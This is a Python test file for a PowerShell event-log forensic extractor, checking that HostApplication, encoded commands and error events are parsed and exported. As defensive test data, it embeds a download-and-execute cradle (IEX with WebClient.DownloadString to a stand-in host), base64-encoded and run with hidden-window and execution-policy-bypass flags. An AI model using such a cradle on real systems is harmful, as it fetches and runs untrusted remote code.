"""PowerShell History reads every field of the classic "Windows PowerShell" log.

Reported by the user: the export never shows EID 400's HostApplication (how
powershell.exe was started, with its arguments and any -EncodedCommand).

Measured on the real logs before the fix: pyevtx-rs gives these events'
EventData as {"Data": {"#text": [str, str, str]}} -- a LIST of three strings --
and extract_eventdata only parsed a single string, so EVERY 400/403/600/800
came out empty (0 of 874 EID 400 with a HostApplication on the main corpus,
same on all seven baseline machines).  With no HostId every session became a
"ghost" and was left out of ps_commands.txt, the JSON and the xlsx.  Also:
  * HostApplication spans several lines when PowerShell was started with a
    multi-line command (32% of EID 400 on the corpus): a line-by-line k=v
    parse cut it and invented fields;
  * EID 800 keeps its command line in the first string and the
    CommandInvocation / ParameterBinding details in the third; neither was read;
  * -EncodedCommand was only recognised as -EncodedCommand, -enc or -ec,
    while PowerShell accepts any prefix (-e, -en, -encodedc, ...) and /enc;
  * EID 4100 (Operational: a PowerShell error, with the failing command and
    host application) was not extracted at all;
  * the xlsx cut HostApplication to 500 characters.

Real-data block (needs EVTX_TEST_LOGS / EVTX_TEST_LOGS_ONLINE): every extracted
HostApplication must equal the text sliced straight out of the raw event
between "HostApplication=" and "EngineVersion=" -- an independent path.
"""
import base64
import glob
import json
import os
import re
import sys
import tempfile

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
sys.stdout.reconfigure(errors="backslashreplace")

CHECKS = []


def check(name, cond, detail=""):
    CHECKS.append((name, bool(cond), detail))
    print(f"  {'PASS' if cond else 'FAIL'}  {name}" + (f"  -- {detail}" if detail else ""), flush=True)


def b64(text):
    return base64.b64encode(text.encode("utf-16-le")).decode()


def classic(eid, block, pos0="Available", pos1="None", third=None, host_id="HID-1"):
    """An event shaped exactly as pyevtx-rs gives the classic channel."""
    texts = [pos0, pos1, block] if third is None else [pos0, block, third]
    return {"Event": {
        "System": {"EventID": {"#attributes": {"Qualifiers": 0}, "#text": eid},
                   "Channel": "Windows PowerShell", "Computer": "C1",
                   "TimeCreated": {"#attributes": {"SystemTime": "2024-01-02T03:04:05.000000Z"}},
                   "Execution": {"#attributes": {"ProcessID": 4321, "ThreadID": 1}}},
        "EventData": {"Data": {"#text": texts}}},
        "_record_id": 7}


def block(host_app, host_id="HID-1", extra=""):
    return ("\tNewEngineState=Available\r\n\tPreviousEngineState=None\r\n\r\n\tSequenceNumber=13\r\n\r\n"
            "\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1\r\n"
            f"\tHostId={host_id}\r\n\tHostApplication={host_app}\r\n"
            "\tEngineVersion=5.1.19041.1\r\n\tRunspaceId=RS-1\r\n\tPipelineId=\r\n\tCommandName=\r\n"
            "\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=" + extra)


def synthetic():
    print("=== synthetic ===", flush=True)
    from evtx_tool.analysis.ps_extractor import event_parsers as P

    r = P.parse_400(classic(400, block("powershell.exe -nop -w hidden -c Get-Date")))
    check("400: HostApplication read", r.get("host_application") == "powershell.exe -nop -w hidden -c Get-Date",
          repr(r.get("host_application")))
    check("400: HostId, HostName, EngineVersion, RunspaceId read",
          (r.get("host_id"), r.get("host_name"), r.get("engine_version"), r.get("runspace_id"))
          == ("HID-1", "ConsoleHost", "5.1.19041.1", "RS-1"), str(r))
    check("400: engine states read", (r.get("new_engine_state"), r.get("prev_engine_state")) == ("Available", "None"))

    multi = "powershell.exe -Command $Res = 0\r\n[UInt64]$Min=500\r\n  $SystemDrive=(gwmi).x\r\n$Res"
    r = P.parse_400(classic(400, block(multi)))
    want = "powershell.exe -Command $Res = 0\n[UInt64]$Min=500\n  $SystemDrive=(gwmi).x\n$Res"
    check("400: a multi-line HostApplication is kept whole", r.get("host_application") == want,
          repr(r.get("host_application")))
    check("400: ...and its lines do not become fields", r.get("engine_version") == "5.1.19041.1")

    payload = "IEX (New-Object Net.WebClient).DownloadString('http://x/a')"
    for flag in ("-e", "-en", "-enc", "-EncodedCommand", "-ec", "-EnCoDeD", "-encodedc", "/enc"):
        r = P.parse_400(classic(400, block(f"powershell.exe -nop -w hidden {flag} {b64(payload)}")))
        check(f"400: {flag} decoded", r.get("encoded_command") == payload, repr(r.get("encoded_command"))[:80])
    r = P.parse_400(classic(400, block(f'powershell.exe -e "{b64(payload)}"')))
    check("400: quoted encoded argument decoded", r.get("encoded_command") == payload)
    for host_app in ("powershell.exe -ep bypass -nop", "powershell.exe -ExecutionPolicy Bypass -File a.ps1",
                     "powershell.exe -c echo hello"):
        r = P.parse_400(classic(400, block(host_app)))
        check(f"400: no encoded command in {host_app!r}", r.get("encoded_command") == "", repr(r.get("encoded_command")))

    r = P.parse_403(classic(403, block("powershell.exe -c x", host_id="HID-9")))
    check("403: HostId read (pairs the stop with its start)", r.get("host_id") == "HID-9", str(r.get("host_id")))
    r = P.parse_600(classic(600, block("powershell.exe"), pos0="Registry", pos1="Started"))
    check("600: provider name read", r.get("provider_name") == "Registry", repr(r.get("provider_name")))

    blk800 = ("\tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=21\r\n\r\n\tUserId=U\r\n\tHostName=ConsoleHost\r\n"
              "\tHostVersion=5.1\r\n\tHostId=HID-1\r\n\tHostApplication=powershell.exe -c Add-Type\r\n\tEngineVersion=5.1\r\n"
              "\tRunspaceId=RS-1\r\n\tPipelineId=3\r\n\tScriptName=\r\n\tCommandLine=")
    details = 'CommandInvocation(Add-Type): "Add-Type"\r\nParameterBinding(Add-Type): name="TypeDefinition"; value="class X {}"'
    r = P.parse_800(classic(800, blk800, pos0="Add-Type -TypeDefinition $src", third=details))
    check("800: command line read from the first string", r.get("command_line") == "Add-Type -TypeDefinition $src",
          repr(r.get("command_line")))
    check("800: command name read from CommandInvocation", r.get("command_name") == "Add-Type", repr(r.get("command_name")))
    check("800: parameter bindings kept", "ParameterBinding(Add-Type)" in (r.get("details") or ""), repr(r.get("details")))
    check("800: HostApplication and HostId read", (r.get("host_application"), r.get("host_id")) ==
          ("powershell.exe -c Add-Type", "HID-1"), str(r))

    ctx = ("        Severity = Informational\r\n        Host Name = ConsoleHost\r\n        Host Version = 5.1\r\n"
           "        Host ID = HID-2\r\n        Host Application = powershell.exe -Command $a = 1\r\n$b = 2\r\n"
           "        Engine Version = 5.1\r\n        Runspace ID = RS\r\n        Pipeline ID = 1\r\n"
           "        Command Name = Invoke-Thing\r\n        Command Type = Cmdlet\r\n        Script Name = \r\n"
           "        Command Path = \r\n        Sequence Number = 5\r\n        User = U\r\n        Connected User = \r\n"
           "        Shell ID = Microsoft.PowerShell\r\n")
    op = {"Event": {"System": {"EventID": 4103, "Channel": "Microsoft-Windows-PowerShell/Operational",
                               "Computer": "C1", "TimeCreated": {"#attributes": {"SystemTime": "2024-01-02T03:04:06Z"}},
                               "Execution": {"#attributes": {"ProcessID": 4321}}},
                    "EventData": {"ContextInfo": ctx, "UserData": "", "Payload": "CommandInvocation(Invoke-Thing)"}},
          "_record_id": 8}
    r = P.parse_4103(op)
    check("4103: a multi-line Host Application is kept whole",
          r.get("host_application") == "powershell.exe -Command $a = 1\n$b = 2", repr(r.get("host_application")))
    check("4103: fields after it still read", (r.get("command_name"), r.get("host_id")) == ("Invoke-Thing", "HID-2"))

    parse_4100 = getattr(P, "parse_4100", None)
    check("4100 (PowerShell error) has a parser", parse_4100 is not None)
    if parse_4100:
        op4100 = json.loads(json.dumps(op))
        op4100["Event"]["System"]["EventID"] = 4100
        op4100["Event"]["EventData"]["Payload"] = "Error Message = Access denied\r\nFully Qualified Error ID = X"
        r = parse_4100(op4100)
        check("4100: error message, command and host application read",
              "Access denied" in (r.get("payload") or "") and r.get("command_name") == "Invoke-Thing"
              and r.get("host_application", "").startswith("powershell.exe"), str(r)[:200])


def raw_rec(event, rid):
    """A record as the engine hands it to PSExtractor."""
    return {"data": json.dumps(event), "event_record_id": rid, "_source_file": "synthetic.evtx"}


def op_event(eid, event_data, pid=4321, ts="2024-01-02T03:04:07Z"):
    return {"Event": {"System": {"EventID": eid, "Channel": "Microsoft-Windows-PowerShell/Operational",
                                 "Computer": "C1", "TimeCreated": {"#attributes": {"SystemTime": ts}},
                                 "Execution": {"#attributes": {"ProcessID": pid}}},
                      "EventData": event_data}}


def coverage():
    """Every PowerShell event reaches the outputs: the 300 / 4102 / 53504 that
    were never extracted, events with no engine start to hang on, and a count
    of the IDs that carry nothing to extract."""
    print("\n=== coverage ===", flush=True)
    from evtx_tool.analysis.ps_extractor import event_parsers as P
    from evtx_tool.analysis.ps_extractor.extractor import PSExtractor

    multi = "powershell.exe -Command $Res = 0\r\n[UInt64]$MinDiskSpaceThreshold=500\r\n$Res"
    blk300 = ("\tProviderName=Microsoft.PowerShell.Core\\FileSystem\r\n\tExceptionClass=DriveNotFoundException\r\n"
              "\tErrorCategory=\r\n\tErrorId=\r\n\tErrorMessage=Could not find the drive 'a:\\'.\r\n\r\n"
              "\tSeverity=Warning\r\n\r\n\tSequenceNumber=15\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1\r\n"
              f"\tHostId=HID-1\r\n\tHostApplication={multi}\r\n\tEngineVersion=5.1\r\n\tRunspaceId=RS-1\r\n"
              "\tPipelineId=1\r\n\tCommandName=Set-Location\r\n\tCommandType=Cmdlet\r\n\tScriptName=\r\n"
              "\tCommandPath=\r\n\tCommandLine=")
    ev300 = classic(300, blk300)
    ev300["Event"]["EventData"]["Data"]["#text"] = ["Could not find the drive 'a:\\'.", blk300]
    parse_300 = getattr(P, "parse_300", None)
    check("300 (provider/engine error) has a parser", parse_300 is not None)
    if parse_300:
        r = parse_300(ev300)
        check("300: error message, exception, command and HostId read",
              (r.get("error_message"), r.get("exception_class"), r.get("command_name"), r.get("host_id"))
              == ("Could not find the drive 'a:\\'.", "DriveNotFoundException", "Set-Location", "HID-1"), str(r)[:300])
        check("300: a multi-line HostApplication is kept whole",
              r.get("host_application") == multi.replace("\r\n", "\n"), repr(r.get("host_application")))

    ctx = ("        Severity = Warning\r\n        Host Name = ConsoleHost\r\n        Host ID = HID-1\r\n"
           "        Host Application = powershell.exe -ExecutionPolicy Bypass a:\\x.ps1\r\n"
           "        Command Name = Get-Thing\r\n        User = U\r\n")
    ev4102 = op_event(4102, {"ContextInfo": ctx, "UserData": "", "Payload": "Error Message = Drive gone\r\n"})
    parse_4102 = getattr(P, "parse_4102", None)
    check("4102 (PowerShell warning) has a parser", parse_4102 is not None)
    if parse_4102:
        r = parse_4102(ev4102)
        check("4102: event id, message, command and host application read",
              (r.get("event_id"), r.get("error_message"), r.get("command_name"), r.get("host_id"))
              == (4102, "Drive gone", "Get-Thing", "HID-1") and r.get("host_application", "").endswith("x.ps1"),
              str(r)[:300])

    # Written as the process loads the engine: just before its EID 400 (03:04:05).
    ev53504 = op_event(53504, {"param1": "4321", "param2": "DefaultAppDomain"}, ts="2024-01-02T03:04:04.500Z")
    parse_53504 = getattr(P, "parse_53504", None)
    check("53504 (PowerShell IPC listener: hosting process) has a parser", parse_53504 is not None)
    if parse_53504:
        r = parse_53504(ev53504)
        check("53504: process id and AppDomain read",
              (r.get("pid"), r.get("app_domain")) == ("4321", "DefaultAppDomain"), str(r))

    def orphan(eid, hid, pos0, pos1):
        e = classic(eid, block("powershell.exe -c lonely", host_id=hid), pos0=pos0, pos1=pos1)
        e["Event"]["System"]["Execution"]["#attributes"]["ProcessID"] = 999
        return e
    lone4103 = op_event(4103, {"ContextInfo": "        Command Name = Lone-Cmd\r\n        Host ID = HID-NONE\r\n",
                               "UserData": "", "Payload": "CommandInvocation(Lone-Cmd)"}, pid=777)
    events = [
        classic(400, block("powershell.exe -c start")), ev300, ev4102, ev53504,
        op_event(53504, {"param1": "999", "param2": "SomeOtherDomain"}, pid=999),
        orphan(600, "HID-ORPHAN", "Registry", "Started"), orphan(403, "HID-ORPHAN", "Stopped", "Available"),
        lone4103,
        op_event(4105, {"ScriptBlockId": "SB", "RunspaceId": "RS"}), op_event(40961, None),
    ]
    out = tempfile.mkdtemp(prefix="ps_cov_")
    PSExtractor([raw_rec(e, i + 1) for i, e in enumerate(events)], out, ["synthetic.evtx"]).run()
    data = json.load(open(os.path.join(out, "ps_extraction.json"), encoding="utf-8"))
    sess_eids = sorted(e["event_id"] for s in data["sessions"] for e in s["events"])
    check("JSON: 300, 4102 and 53504 sit in their session", all(x in sess_eids for x in (300, 4102, 53504)),
          str(sess_eids))
    loose = data.get("unsessioned_events", [])
    loose_ids = sorted((e["event_id"], e.get("event_record_id")) for e in loose)
    check("JSON: events with no engine start are kept (orphan 600 and 403, lone 4103, foreign 53504)",
          loose_ids == [(403, 7), (600, 6), (4103, 8), (53504, 5)], str(loose_ids))
    check("JSON: every event carries its record id",
          all("event_record_id" in e for s in data["sessions"] for e in s["events"]))
    txt = open(os.path.join(out, "ps_commands.txt"), encoding="utf-8").read()
    check("ps_commands.txt: 300, 4102 and 53504 lines, with the 300 error and the AppDomain",
          all(t in txt for t in ("EID:300", "EID:4102", "EID:53504", "Could not find the drive", "DefaultAppDomain")))
    tail = txt.split("UNSESSIONED")[-1] if "UNSESSIONED" in txt else ""
    check("ps_commands.txt: orphan 600 and 403 listed with the unsessioned events",
          "PROVIDER_START" in tail and "ENGINE_STOP" in tail, tail[:400])
    from openpyxl import load_workbook
    rows = list(load_workbook(os.path.join(out, "ps_timeline.xlsx"), read_only=True).active.iter_rows(values_only=True))
    ei = list(rows[0]).index("event_id")
    xl_eids = sorted(int(r[ei]) for r in rows[1:])
    check("xlsx: one row per extracted event, 300 / 4102 / 53504 included",
          xl_eids == sorted([400, 300, 4102, 53504, 53504, 600, 403, 4103]), str(xl_eids))
    summ = open(os.path.join(out, "ps_extraction_summary.txt"), encoding="utf-8").read()
    check("summary: counts 300, 4102 and 53504",
          all(re.search(rf"EID {e}\s.*:\s+{n}\b", summ) for e, n in ((300, 1), (4102, 1), (53504, 2))))
    check("summary: PowerShell events that are not extracted are counted by ID, not dropped unseen",
          re.search(r"EID 4105\b.*:\s+1\b", summ) is not None and re.search(r"EID 40961\b.*:\s+1\b", summ) is not None,
          summ[summ.find("NOT EXTRACTED"):][:300] if "NOT EXTRACTED" in summ else "no such section")


def raw_slice(text):
    """HostApplication value cut straight out of the raw text (independent of the parser)."""
    m = re.search(r"HostApplication=(.*?)\r?\n\tEngineVersion=", text, re.S)
    return m.group(1).replace("\r\n", "\n").strip() if m else None


def real():
    roots = [p for p in (os.environ.get("EVTX_TEST_LOGS", ""), os.environ.get("EVTX_TEST_LOGS_ONLINE", "")) if p]
    files = []
    for root in roots:
        files += glob.glob(os.path.join(root, "Windows PowerShell.evtx"))
        files += glob.glob(os.path.join(root, "*", "*", "Windows PowerShell.evtx"))
    if not files:
        print("EVTX_TEST_LOGS / EVTX_TEST_LOGS_ONLINE not set -- real-data block skipped")
        return
    import evtx
    from evtx_tool.analysis.ps_extractor import event_parsers as P
    from evtx_tool.analysis.ps_extractor.extractor import PSExtractor
    parsers = {400: P.parse_400, 403: P.parse_403, 600: P.parse_600, 800: P.parse_800}
    print(f"\n=== real: {len(files)} Windows PowerShell logs ===", flush=True)
    n = {k: 0 for k in parsers}; got = {k: 0 for k in parsers}; absent = {k: 0 for k in parsers}; wrong = []
    for f in files:
        for rec in evtx.PyEvtxParser(f).records_json():
            d = json.loads(rec["data"])
            eid = d["Event"]["System"]["EventID"]
            eid = int(eid["#text"] if isinstance(eid, dict) else eid)
            if eid not in parsers:
                continue
            texts = d["Event"]["EventData"]["Data"]["#text"]
            want = next((v for v in (raw_slice(t) for t in texts if isinstance(t, str)) if v is not None), None)
            p = parsers[eid]({**d, "_record_id": rec["event_record_id"]})
            n[eid] += 1
            if want is None and not any(isinstance(t, str) and "HostApplication=" in t for t in texts):
                # Older (2.0-era) engine events carry no HostApplication field at all;
                # the parser must say nothing rather than invent one.
                absent[eid] += 1
                if not p.get("host_application"):
                    got[eid] += 1
                elif len(wrong) < 3:
                    wrong.append((eid, rec["event_record_id"], 0, len(p.get("host_application") or "")))
            elif p.get("host_application") == want and want is not None:
                got[eid] += 1
            elif len(wrong) < 3:
                wrong.append((eid, rec["event_record_id"], len(want or ""), len(p.get("host_application") or "")))
    for eid in parsers:
        check(f"real: EID {eid} HostApplication equals the raw text, every event", got[eid] == n[eid] and n[eid] > 0,
              f"{got[eid]:,} of {n[eid]:,} ({absent[eid]:,} with no HostApplication field); "
              f"first wrong (eid, record, raw len, parsed len): {wrong}")

    # End to end on the main corpus log: every engine start is in the outputs.
    main_log = next((f for f in files if os.path.dirname(f) == os.environ.get("EVTX_TEST_LOGS", "")), None)
    if main_log:
        out = tempfile.mkdtemp(prefix="ps_fields_")
        recs = []
        for rec in evtx.PyEvtxParser(main_log).records_json():
            rec["_source_file"] = main_log
            recs.append(rec)
        PSExtractor(recs, out, [main_log]).run()
        data = json.load(open(os.path.join(out, "ps_extraction.json"), encoding="utf-8"))
        def eid_of(r):
            e = json.loads(r["data"])["Event"]["System"]["EventID"]
            return int(e["#text"] if isinstance(e, dict) else e)
        starts = sum(1 for r in recs if eid_of(r) == 400)
        with_app = sum(1 for s in data["sessions"] if s.get("host_application"))
        check("real end to end: every engine start is a session with its HostApplication in the JSON",
              with_app == starts and starts > 0, f"{with_app:,} sessions with HostApplication, {starts:,} EID 400")
        txt = open(os.path.join(out, "ps_commands.txt"), encoding="utf-8").read()
        lines = [l for l in txt.splitlines() if l.startswith("  HostApplication: ") and l.strip() != "HostApplication:"]
        check("real end to end: ps_commands.txt shows them", len(lines) == starts, f"{len(lines):,} vs {starts:,}")
        from openpyxl import load_workbook
        ws = load_workbook(os.path.join(out, "ps_timeline.xlsx"), read_only=True).active
        rows = list(ws.iter_rows(values_only=True))
        hdr = list(rows[0])
        di, ei = hdr.index("detail"), hdr.index("event_id")
        sess_app = {s["host_id"]: s["host_application"] for s in data["sessions"]}
        longest = max((len(" ".join(v.split())) for v in sess_app.values()), default=0)
        xl = [r[di] or "" for r in rows[1:] if str(r[ei]) == "400"]
        check("real end to end: xlsx keeps the longest HostApplication whole",
              any(len(x) >= longest for x in xl) and not any(x.endswith("...") for x in xl),
              f"longest {longest} chars; longest cell {max((len(x) for x in xl), default=0)}")

    # Both PowerShell logs of the main corpus: every record that is not a 4104
    # fragment (those are in script_blocks) appears as an event in the JSON,
    # or, for IDs with nothing to extract, is counted in the summary.
    root = os.environ.get("EVTX_TEST_LOGS", "")
    logs = [f for f in (os.path.join(root, "Windows PowerShell.evtx"),
                        os.path.join(root, "Microsoft-Windows-PowerShell%4Operational.evtx"))
            if root and os.path.exists(f)]
    if len(logs) == 2:
        out = tempfile.mkdtemp(prefix="ps_all_")
        recs = []
        for f in logs:
            for rec in evtx.PyEvtxParser(f).records_json():
                rec["_source_file"] = f
                recs.append(rec)
        want = {}
        for r in recs:
            e = eid_of(r)
            if e != 4104:
                want.setdefault(e, set()).add(r["event_record_id"])
        PSExtractor(recs, out, logs).run()
        data = json.load(open(os.path.join(out, "ps_extraction.json"), encoding="utf-8"))
        evs = [e for s in data["sessions"] for e in s["events"]] + data.get("unsessioned_events", [])
        have = {}
        for e in evs:
            have.setdefault(e["event_id"], set()).add(e.get("event_record_id"))
        summ = open(os.path.join(out, "ps_extraction_summary.txt"), encoding="utf-8").read()
        for e in sorted(want):
            if e in (300, 400, 403, 600, 800, 4100, 4102, 4103, 53504):
                check(f"real end to end: every EID {e} record is in the JSON",
                      want[e] <= have.get(e, set()), f"{len(want[e] & have.get(e, set())):,} of {len(want[e]):,}")
            else:
                check(f"real end to end: EID {e} counted in the summary",
                      re.search(rf"EID {e}\b.*:\s+{len(want[e]):,}\b", summ) is not None,
                      f"{len(want[e]):,} records")


def main() -> int:
    synthetic()
    coverage()
    real()
    ok = sum(1 for _n, c, _d in CHECKS if c)
    print(f"\n{'='*62}\n{ok}/{len(CHECKS)} checks passed")
    for n_, c, d in CHECKS:
        if not c:
            print(f"  FAILED: {n_}  {d}")
    return 0 if ok == len(CHECKS) else 1


if __name__ == "__main__":
    sys.exit(main())
